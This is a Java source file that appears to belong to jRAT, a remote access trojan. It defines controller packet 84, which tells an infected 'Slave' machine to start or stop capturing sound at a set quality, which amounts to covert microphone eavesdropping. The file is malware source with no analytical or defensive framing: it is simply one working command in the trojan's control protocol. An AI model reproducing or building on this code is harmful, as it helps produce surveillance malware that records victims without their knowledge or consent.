package jrat.controller.packets.outgoing;

import jrat.controller.Slave;


public class Packet84ToggleSoundCapture implements OutgoingPacket {

	private boolean enable;
	private int quality;
	
	public Packet84ToggleSoundCapture(boolean enable, int quality) {
		this.enable = enable;
		this.quality = quality;
	}

	@Override
	public void write(Slave slave) throws Exception {
		slave.writeBoolean(enable);
		slave.writeInt(quality);
	}

	@Override
	public short getPacketId() {
		return 84;
	}

}
